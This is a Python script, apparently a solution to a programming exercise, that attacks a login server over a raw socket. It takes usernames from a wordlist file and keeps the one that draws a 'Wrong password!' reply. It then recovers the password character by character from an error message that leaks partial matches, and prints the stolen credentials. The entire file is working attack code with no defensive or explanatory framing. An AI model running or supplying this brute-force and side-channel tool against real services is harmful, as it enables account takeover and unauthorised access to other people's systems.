import socket
import json
import sys

def perform_request(s, login, password):
    request = {'login': login, 'password': password}
    s.sendall(json.dumps(request).encode())
    return json.loads(s.recv(2048).decode())

def find_login(s):
    with open('../logins.txt', 'r') as file:
        logins = file.read().splitlines()
    for login in logins:
        response = perform_request(s, login, '')
        if response['result'] == 'Wrong password!':
            return login
    return None

def find_password(s, login):
    password = ''
    while True:
        for char in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890':
            current_password = password + char
            response = perform_request(s, login, current_password)
            if response['result'] == 'Connection success!':
                return current_password
            if response['result'] == 'Exception happened during login':
                password += char
                break

def main():
    host = sys.argv[1]
    port = int(sys.argv[2])
    with socket.socket() as s:
        s.connect((host, port))
        login = find_login(s)
        if login:
            password = find_password(s, login)
            if password:
                print(json.dumps({'login': login, 'password': password}))
            else:
                print("Failed to find valid password.")
        else:
            print("Failed to find valid login.")

if __name__ == '__main__':
    main()
